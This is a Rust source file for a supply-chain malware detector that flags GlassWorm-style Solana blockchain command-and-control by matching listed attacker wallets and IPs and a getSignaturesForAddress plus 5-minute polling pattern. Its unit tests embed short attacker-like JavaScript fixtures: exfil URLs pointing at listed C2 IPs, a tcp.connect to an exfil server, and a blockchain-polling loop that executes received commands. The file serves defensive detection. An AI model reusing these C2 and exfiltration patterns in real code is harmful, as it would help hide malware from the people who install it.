//! Blockchain C2 Detector (GW011)
//!
//! Detects command-and-control communication via blockchain polling,
//! specifically Solana-based C2 used in GlassWorm campaign.
//!
//! ## Detection Logic (UPDATED 2026-03-26)
//!
//! This detector emits findings ONLY for:
//! 1. Known GlassWorm wallet addresses (CRITICAL - always flag)
//! 2. Known GlassWorm C2 IP addresses (CRITICAL - always flag)
//! 3. GlassWorm C2 signature: getSignaturesForAddress + setInterval + 5-min polling (HIGH)
//!
//! ## IMPORTANT: False Positive Prevention
//!
//! Legitimate crypto packages (ethers, web3, @solana/web3.js, viem, wagmi, firebase, etc.)
//! use blockchain APIs as their PRIMARY FUNCTION. These should NOT be flagged.
//!
//! DO NOT flag:
//! - Generic Solana RPC usage (legitimate SDK)
//! - Generic Firebase usage (legitimate SDK)
//! - Generic blockchain API usage (legitimate SDK)
//! - Generic polling intervals (unless 5-minute GlassWorm signature)
//!
//! Only flag when:
//! - Known C2 wallet/IP is present (definitive GlassWorm indicators)
//! - GlassWorm C2 signature: getSignaturesForAddress + setInterval + 300000ms (5 min)
//!
//! ## Severity
//!
//! Critical: Known C2 wallets, known C2 IPs
//! High: GlassWorm C2 signature (getSignaturesForAddress + setInterval + 5min)

use crate::detector::{Detector, DetectorMetadata, DetectorTier};
use crate::finding::{DetectionCategory, Finding, Severity};
use crate::ir::FileIR;
use once_cell::sync::Lazy;
use regex::Regex;
use std::path::Path;

/// Known GlassWorm C2 wallet addresses
/// Source: https://codeberg.org/tip-o-deincognito/glassworm-writeup
const KNOWN_C2_WALLETS: &[&str] = &[
    // GlassWorm Core
    "BjVeAjPrSKFiingBn4vZvghsGj9KCE8AJVtbc9S8o8SC",  // ForceMemo C2
    "28PKnu7RzizxBzFPoLp69HLXp9bJL3JFtT2s5QzHsEA2",  // Primary GlassWorm

    // ForceMemo
    "G2YxRa6wt1qePMwfJzdXZG62ej4qaTC7YURzuh2Lwd3t",  // ForceMemo funding

    // Chrome RAT (from Sonatype/Aikido reports Mar 2026)
    "DSRUBTziADDHSik7WQvSMjvwCHFsbsThrbbjWMoJPUiW",  // Chrome extension RAT C2
    "6YGcuyFRJKZtcaYCCFba9fScNUvPkGXodXE1mJiSzqDJ",  // Payload delivery URLs
];

/// Known GlassWorm C2 IP addresses (from Sonatype/Aikido reports Mar 2026)
const KNOWN_C2_IPS: &[&str] = &[
    "104.238.191.54",    // Vultr AS20473 - GlassWorm infrastructure
    "108.61.208.161",    // Vultr AS20473 - GlassWorm infrastructure
    "45.150.34.158",     // Non-Vultr - led-win32 exfil server (Part 5)
    // New C2 IPs from Mar 2026 reports
    "45.32.150.251",
    "45.32.151.157",
    "70.34.242.255",
    "217.69.3.152",      // Exfil endpoint /wall
    "217.69.3.51",
    "217.69.11.99",
    "217.69.0.159",
];

/// GlassWorm C2 signature pattern: getSignaturesForAddress + setInterval + 5min polling
/// UPDATED: Match getSignaturesForAddress usage with setInterval (regardless of hardcoded wallet)
/// This catches both hardcoded wallets AND variable-based wallets
static GLASSWORM_C2_PATTERN: Lazy<Regex> = Lazy::new(|| {
    // Match: getSignaturesForAddress function call
    // Combined with setInterval check in has_glassworm_c2_signature()
    Regex::new(r"getSignaturesForAddress\s*\(").unwrap()
});

/// 5-minute polling pattern (300000ms = 5 minutes)
static FIVE_MIN_POLLING_PATTERN: Lazy<Regex> = Lazy::new(|| {
    // Match setInterval with 300000ms (5 minutes) - GlassWorm signature
    // Also match POLL_INTERVAL = 300000 or similar constant definitions
    Regex::new(r"(setInterval\s*\([^)]+,\s*300000\s*\)|POLL_INTERVAL\s*=\s*300000)").unwrap()
});

/// Check if this looks like SDK source code (should be skipped)
/// UPDATED 2026-03-26: Only skip actual SDK implementation files, not files that USE the SDK
fn is_sdk_source_code(content: &str) -> bool {
    let sdk_patterns = [
        // Class declarations (SDK implementation)
        "class Connection {",
        "class PublicKey {",
        "class Transaction {",
        "class Wallet {",
        
        // Export patterns (SDK module exports) - be specific
        "export class Connection",
        "export class PublicKey",
        "module.exports.Connection =",
        "module.exports.PublicKey =",
        
        // Constructor patterns (SDK class constructors)
        "constructor(rpcUrl",
        "constructor(endpoint",
        
        // TypeScript SDK patterns
        "implements ConnectionInterface",
        "extends EventEmitter",
        
        // SDK method implementations (NOT calls) - be specific
        "async getSignaturesForAddress(pubKey",
        "async getSignaturesForAddress(address",
        "async getSignaturesForAddress(wallet",
    ];

    sdk_patterns.iter().any(|p| content.contains(p))
}

/// Detector for blockchain C2
pub struct BlockchainC2Detector;

impl BlockchainC2Detector {
    /// Create a new blockchain C2 detector
    pub fn new() -> Self {
        Self
    }

    /// Check if content has GlassWorm C2 signature
    /// Pattern: getSignaturesForAddress + setInterval + 5min polling
    /// UPDATED: Also check for 5-minute polling to confirm GlassWorm signature
    fn has_glassworm_c2_signature(&self, content: &str) -> bool {
        // Skip SDK source code
        if is_sdk_source_code(content) {
            return false;
        }
        
        // Must have BOTH getSignaturesForAddress AND 5-minute polling
        GLASSWORM_C2_PATTERN.is_match(content) && self.has_5min_polling(content)
    }

    /// Check if content has 5-minute polling (GlassWorm signature)
    fn has_5min_polling(&self, content: &str) -> bool {
        FIVE_MIN_POLLING_PATTERN.is_match(content)
    }
}

impl Default for BlockchainC2Detector {
    fn default() -> Self {
        Self::new()
    }
}

impl Detector for BlockchainC2Detector {
    fn name(&self) -> &str {
        "blockchain_c2"
    }

    fn tier(&self) -> DetectorTier {
        DetectorTier::Tier3Behavioral
    }

    fn cost(&self) -> u8 {
        4  // Low-medium cost - string matching + regex
    }

    fn signal_strength(&self) -> u8 {
        9  // Very high signal for known C2 wallets/IPs, high for GlassWorm signature
    }

    fn prerequisites(&self) -> Vec<&'static str> {
        vec!["glassware", "encrypted_payload"]  // Run after Tier 2
    }

    fn should_short_circuit(&self, findings: &[Finding]) -> bool {
        // Don't run Tier 3 if nothing found by Tier 1-2
        findings.is_empty()
    }

    fn detect(&self, ir: &FileIR) -> Vec<Finding> {
        let mut findings = Vec::new();
        let content = ir.content();
        let path = &ir.metadata.path;

        // Skip TypeScript definition files (.d.ts) - they contain type definitions, not C2 logic
        if path.ends_with(".d.ts") {
            return findings;
        }

        // UPDATED 2026-03-26: Skip SDK source code files
        // SDK files contain function definitions, class declarations, exports
        // These are NOT C2 code - they're the legitimate blockchain SDK implementation
        if is_sdk_source_code(content) {
            return findings;
        }

        // === CRITICAL: Check known malicious wallets (ALWAYS flag) ===
        for wallet in KNOWN_C2_WALLETS {
            if content.contains(wallet) {
                // Find line number for the finding
                let line_num = content
                    .lines()
                    .position(|line| line.contains(wallet))
                    .unwrap_or(0) + 1;

                findings.push(
                    Finding::new(
                        path,
                        line_num,
                        1,
                        0,
                        '\0',
                        DetectionCategory::BlockchainC2,
                        Severity::Critical,
                        &format!("Known GlassWorm C2 wallet address: {}", wallet),
                        "CRITICAL: This is a confirmed GlassWorm command-and-control wallet. \
                         Immediate investigation and reporting required.",
                    )
                    .with_cwe_id("CWE-506")
                    .with_reference(
                        "https://www.aikido.dev/blog/glassworm-returns-unicode-attack-github-npm-vscode",
                    ),
                );
            }
        }

        // === CRITICAL: Check known malicious IPs (ALWAYS flag) ===
        for ip in KNOWN_C2_IPS {
            if content.contains(ip) {
                // Find line number for the finding
                let line_num = content
                    .lines()
                    .position(|line| line.contains(ip))
                    .unwrap_or(0) + 1;

                findings.push(
                    Finding::new(
                        path,
                        line_num,
                        1,
                        0,
                        '\0',
                        DetectionCategory::BlockchainC2,
                        Severity::Critical,
                        &format!("Known GlassWorm C2 IP address: {}", ip),
                        "CRITICAL: This IP is associated with GlassWorm infrastructure. \
                         Immediate investigation required.",
                    )
                    .with_cwe_id("CWE-506")
                    .with_reference(
                        "https://www.aikido.dev/blog/glassworm-returns-unicode-attack-github-npm-vscode",
                    ),
                );
            }
        }

        // === HIGH: Check GlassWorm C2 signature ===
        // Pattern: getSignaturesForAddress + setInterval + 5min polling
        if self.has_glassworm_c2_signature(content) {
            let line_num = content
                .lines()
                .position(|line| line.contains("getSignaturesForAddress") || line.contains("setInterval"))
                .unwrap_or(0) + 1;

            findings.push(
                Finding::new(
                    path,
                    line_num,
                    1,
                    0,
                    '\0',
                    DetectionCategory::BlockchainC2,
                    Severity::High,
                    "GlassWorm C2 signature detected (getSignaturesForAddress + setInterval)",
                    "HIGH: This pattern matches the GlassWorm blockchain C2 signature. \
                     The combination of getSignaturesForAddress with setInterval is used \
                     to poll blockchain for commands. Review for malicious behavior.",
                )
                .with_cwe_id("CWE-506")
                .with_reference(
                    "https://www.aikido.dev/blog/glassworm-returns-unicode-attack-github-npm-vscode",
                ),
            );
        }

        // === HIGH: Check 5-minute polling (GlassWorm signature) ===
        if self.has_5min_polling(content) {
            let line_num = content
                .lines()
                .position(|line| line.contains("setInterval") && line.contains("300000"))
                .unwrap_or(0) + 1;

            findings.push(
                Finding::new(
                    path,
                    line_num,
                    1,
                    0,
                    '\0',
                    DetectionCategory::BlockchainC2,
                    Severity::High,
                    "5-minute polling interval (GlassWorm C2 signature)",
                    "HIGH: 5-minute (300000ms) polling interval is a known GlassWorm C2 signature. \
                     This timing pattern is used to poll blockchain for commands while avoiding detection.",
                )
                .with_cwe_id("CWE-506")
                .with_reference(
                    "https://www.aikido.dev/blog/glassworm-returns-unicode-attack-github-npm-vscode",
                ),
            );
        }

        // === SKIP: Generic blockchain API usage ===
        // Do NOT flag:
        // - Generic Solana RPC usage (legitimate SDK)
        // - Generic Firebase usage (legitimate SDK)
        // - Generic blockchain API usage (legitimate SDK)
        // - Generic polling intervals (unless 5-minute GlassWorm signature)
        //
        // This is the key change from previous version that caused false positives.

        findings
    }

    fn metadata(&self) -> DetectorMetadata {
        DetectorMetadata {
            name: "blockchain_c2".to_string(),
            version: "1.1.0".to_string(),  // Updated version for FP fix
            description: "Detects blockchain-based C2 communication patterns including known GlassWorm wallets/IPs and C2 signatures".to_string(),
        }
    }
}

impl BlockchainC2Detector {
    /// Backward compatibility method for tests
    pub fn scan(&self, path: &Path, content: &str, _config: &crate::config::UnicodeConfig) -> Vec<Finding> {
        // Build IR and call detect (for backward compatibility)
        let ir = FileIR::build(path, content);
        self.detect(&ir)
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::config::UnicodeConfig;

    // === CRITICAL: Known wallet/IP detection (must still work) ===

    #[test]
    fn test_detect_known_wallet() {
        let detector = BlockchainC2Detector::new();
        let content = r#"
            const C2_ADDRESS = "BjVeAjPrSKFiingBn4vZvghsGj9KCE8AJVtbc9S8o8SC";
            const memo = await getLatestMemo(C2_ADDRESS);
        "#;

        let findings = detector.scan(Path::new("test.js"), content, &UnicodeConfig::default());
        assert!(!findings.is_empty());
        assert_eq!(findings[0].severity, Severity::Critical);
        assert!(findings[0].description.contains("Known GlassWorm C2 wallet"));
    }

    #[test]
    fn test_detect_known_ip_vultr() {
        let detector = BlockchainC2Detector::new();
        let content = r#"
            const C2_SERVER = "http://104.238.191.54:8080/exfil";
            const backup = "http://108.61.208.161/api";
        "#;

        let findings = detector.scan(Path::new("test.js"), content, &UnicodeConfig::default());
        assert!(!findings.is_empty());
        assert_eq!(findings[0].severity, Severity::Critical);
        assert!(findings[0].description.contains("Known GlassWorm C2 IP"));
    }

    #[test]
    fn test_detect_known_ip_led_win32() {
        let detector = BlockchainC2Detector::new();
        let content = r#"
            const EXFIL_SERVER = "45.150.34.158:8080";
            tcp.connect(EXFIL_SERVER);
        "#;

        let findings = detector.scan(Path::new("test.js"), content, &UnicodeConfig::default());
        assert!(!findings.is_empty());
        assert_eq!(findings[0].severity, Severity::Critical);
        assert!(findings[0].description.contains("45.150.34.158"));
    }

    // === HIGH: GlassWorm C2 signature detection ===

    #[test]
    fn test_detect_glassworm_c2_signature() {
        let detector = BlockchainC2Detector::new();
        // GlassWorm C2 pattern: hardcoded wallet address with getSignaturesForAddress
        let content = r#"
            const connection = new Connection("https://api.mainnet-beta.solana.com");

            setInterval(async () => {
                const sigs = await connection.getSignaturesForAddress(
                    new PublicKey("28PKnu7RzizxBzFPoLp69HLXp9bJL3JFtT2s5QzHsEA2")
                );
                if (sigs.length > 0) {
                    const tx = await connection.getTransaction(sigs[0].signature);
                    executeCommand(tx);
                }
            }, 300000);
        "#;

        let findings = detector.scan(Path::new("test.js"), content, &UnicodeConfig::default());
        assert!(!findings.is_empty());
        assert!(findings.iter().any(|f| f.severity == Severity::High));
        assert!(findings.iter().any(|f| f.description.contains("GlassWorm C2 signature")));
    }

    #[test]
    fn test_detect_5min_polling() {
        let detector = BlockchainC2Detector::new();
        let content = r#"
            // Poll every 5 minutes
            setInterval(async () => {
                const data = await fetchC2Data();
                processCommands(data);
            }, 300000);
        "#;

        let findings = detector.scan(Path::new("test.js"), content, &UnicodeConfig::default());
        assert!(!findings.is_empty());
        assert!(findings.iter().any(|f| f.description.contains("5-minute polling")));
    }

    // === SKIP: Legitimate SDK usage (should NOT flag) ===

    #[test]
    fn test_no_detect_solana_web3_sdk() {
        let detector = BlockchainC2Detector::new();
        // Simulated @solana/web3.js SDK code
        let content = r#"
            import { Connection, PublicKey, Transaction } from '@solana/web3.js';

            export class SolanaClient {
                constructor(rpcUrl) {
                    this.connection = new Connection(rpcUrl);
                }

                async getBalance(publicKey) {
                    return await this.connection.getBalance(new PublicKey(publicKey));
                }

                async getSignaturesForAddress(address, options) {
                    return await this.connection.getSignaturesForAddress(
                        new PublicKey(address),
                        options
                    );
                }

                async getTransaction(signature) {
                    return await this.connection.getTransaction(signature);
                }
            }
        "#;

        let findings = detector.scan(Path::new("test.js"), content, &UnicodeConfig::default());
        // Should NOT flag legitimate SDK code
        assert!(findings.is_empty(), "Expected no findings for legitimate SDK code, got: {:?}", findings);
    }

    #[test]
    fn test_no_detect_firebase_sdk() {
        let detector = BlockchainC2Detector::new();
        // Simulated Firebase SDK code
        let content = r#"
            import { initializeApp, getApps } from 'firebase/app';
            import { getFirestore, collection, doc } from 'firebase/firestore';

            const firebaseConfig = {
                apiKey: process.env.FIREBASE_API_KEY,
                authDomain: process.env.FIREBASE_AUTH_DOMAIN,
                projectId: process.env.FIREBASE_PROJECT_ID,
            };

            export function initFirebase() {
                if (getApps().length === 0) {
                    const app = initializeApp(firebaseConfig);
                    return getFirestore(app);
                }
                return getFirestore();
            }
        "#;

        let findings = detector.scan(Path::new("test.js"), content, &UnicodeConfig::default());
        // Should NOT flag Firebase SDK code
        assert!(findings.is_empty(), "Expected no findings for Firebase SDK code, got: {:?}", findings);
    }

    #[test]
    fn test_no_detect_generic_blockchain_api() {
        let detector = BlockchainC2Detector::new();
        let content = r#"
            const connection = new Connection("https://api.mainnet-beta.solana.com");

            async function checkBalance(wallet) {
                const balance = await connection.getBalance(wallet);
                return balance;
            }

            async function getTransactionHistory(address) {
                const signatures = await connection.getSignaturesForAddress(address, { limit: 10 });
                return signatures;
            }
        "#;

        let findings = detector.scan(Path::new("test.js"), content, &UnicodeConfig::default());
        // Should NOT flag generic blockchain API usage without C2 patterns
        assert!(findings.is_empty(), "Expected no findings for generic blockchain API, got: {:?}", findings);
    }

    #[test]
    fn test_no_detect_generic_polling() {
        let detector = BlockchainC2Detector::new();
        let content = r#"
            // Legitimate UI refresh polling
            setInterval(() => {
                updateClock();
                refreshData();
            }, 60000); // 1 minute
        "#;

        let findings = detector.scan(Path::new("test.js"), content, &UnicodeConfig::default());
        // Should NOT flag generic polling (not 5-minute GlassWorm signature)
        assert!(findings.is_empty(), "Expected no findings for generic polling, got: {:?}", findings);
    }

    #[test]
    fn test_no_detect_legitimate_setinterval() {
        let detector = BlockchainC2Detector::new();
        let content = r#"
            // Legitimate UI refresh
            setInterval(() => {
                updateClock();
            }, 60000); // 1 minute
        "#;

        let findings = detector.scan(Path::new("test.js"), content, &UnicodeConfig::default());
        assert!(findings.is_empty());
    }

    #[test]
    fn test_no_detect_sdk_source_code() {
        let detector = BlockchainC2Detector::new();
        // SDK source code with function definitions - should NOT be flagged
        let content = r#"
            export class Connection {
                constructor(rpcUrl) {
                    this.rpcUrl = rpcUrl;
                }

                async getSignaturesForAddress(address, options) {
                    const response = await fetch(this.rpcUrl, {
                        method: 'POST',
                        body: JSON.stringify({
                            method: 'getSignaturesForAddress',
                            params: [address, options]
                        })
                    });
                    return response.json();
                }

                async getTransaction(signature) {
                    const response = await fetch(this.rpcUrl, {
                        method: 'POST',
                        body: JSON.stringify({
                            method: 'getTransaction',
                            params: [signature]
                        })
                    });
                    return response.json();
                }
            }

            // Heartbeat
            setInterval(() => {
                console.log('heartbeat');
            }, 30000);
        "#;

        let findings = detector.scan(Path::new("connection.js"), content, &UnicodeConfig::default());
        // Should NOT flag SDK source code
        assert!(findings.is_empty(), "Expected no findings for SDK source code, got: {:?}", findings);
    }

    #[test]
    fn test_no_detect_ethers_sdk() {
        let detector = BlockchainC2Detector::new();
        // Simulated ethers.js SDK code
        let content = r#"
            import { ethers } from 'ethers';

            const provider = new ethers.providers.JsonRpcProvider(process.env.RPC_URL);

            export async function getBalance(address) {
                return await provider.getBalance(address);
            }

            export async function getTransaction(hash) {
                return await provider.getTransaction(hash);
            }
        "#;

        let findings = detector.scan(Path::new("test.js"), content, &UnicodeConfig::default());
        // Should NOT flag ethers.js SDK code
        assert!(findings.is_empty(), "Expected no findings for ethers.js SDK code, got: {:?}", findings);
    }

    // === Edge cases ===

    #[test]
    fn test_detect_wallet_without_polling() {
        let detector = BlockchainC2Detector::new();
        let content = r#"
            // Just a wallet address reference (not C2)
            const DONATION_WALLET = "BjVeAjPrSKFiingBn4vZvghsGj9KCE8AJVtbc9S8o8SC";
        "#;

        let findings = detector.scan(Path::new("test.js"), content, &UnicodeConfig::default());
        // Should still flag known C2 wallet even without polling
        assert!(!findings.is_empty());
        assert_eq!(findings[0].severity, Severity::Critical);
    }

    #[test]
    fn test_detect_ip_without_polling() {
        let detector = BlockchainC2Detector::new();
        let content = r#"
            // Just an IP reference (not C2)
            const SERVER_IP = "104.238.191.54";
        "#;

        let findings = detector.scan(Path::new("test.js"), content, &UnicodeConfig::default());
        // Should still flag known C2 IP even without polling
        assert!(!findings.is_empty());
        assert_eq!(findings[0].severity, Severity::Critical);
    }
}
